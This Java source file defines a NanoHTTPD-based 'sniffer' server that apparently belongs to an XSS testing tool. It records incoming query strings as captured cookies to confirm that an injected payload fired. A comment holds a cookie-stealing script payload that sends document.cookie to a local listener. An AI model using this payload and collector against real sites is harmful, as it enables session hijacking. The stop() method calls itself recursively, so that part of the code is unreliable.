import fi.iki.elonen.NanoHTTPD;
import fi.iki.elonen.ServerRunner;
import org.apache.log4j.Logger;

import java.io.IOException;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

/**
 * Created by Ilya Evlampiev on 08.06.15.
 */
public class SnifferService extends NanoHTTPD {
    //<script> img = new Image(); img.src = "http://localhost:9876/adasdasdas.gif?"+document.cookie; </script>
    List<XSSCheck> xsschecks = new ArrayList<XSSCheck>();

    private static final Logger log = Logger.getLogger(SnifferService.class);

    public SnifferService(int port) {
        super(port);
        try {
            this.start();
        } catch (IOException e) {
            log.error("Sniffer service is not started on port " + port);
        }
        log.info("Sniffer service started on port " + port);

    }

    public void addXSSCheck(XSSCheck x) {
        this.xsschecks.add(x);
    }

    @Override
    public Response serve(IHTTPSession session) {
        Method method = session.getMethod();
        String uri = session.getUri();
        //Map<String, String> parms = session.getParms();
        //for (String param: parms.keySet())
        //{System.out.println(param + " '" + parms.get(param) + "' ");}

        for (XSSCheck x : xsschecks) {
            if (x.getResource().equals(uri.replace("/", ""))) {
                x.setXSSURLCalledStatus(true);
                String xssWorked = session.getQueryParameterString();
                log.info(method + " '" + uri + "' ");
                if (xssWorked != null && !xssWorked.isEmpty()) {
                    log.info("XSS attack succeed, the sniffer received:\n" + xssWorked);
                    x.setXSSCookiesValue(xssWorked);
                    x.setXSSCookiePassedStatus(true);
                }
            }
        }

        String msg = "<html><body><h1>Hello server</h1>\n";
        msg += "</body></html>\n";

        return new NanoHTTPD.Response(msg);
    }

    public void stop() {
        this.stop();
        log.info("Sniffer service stopped on port" + this.getListeningPort());
    }

}
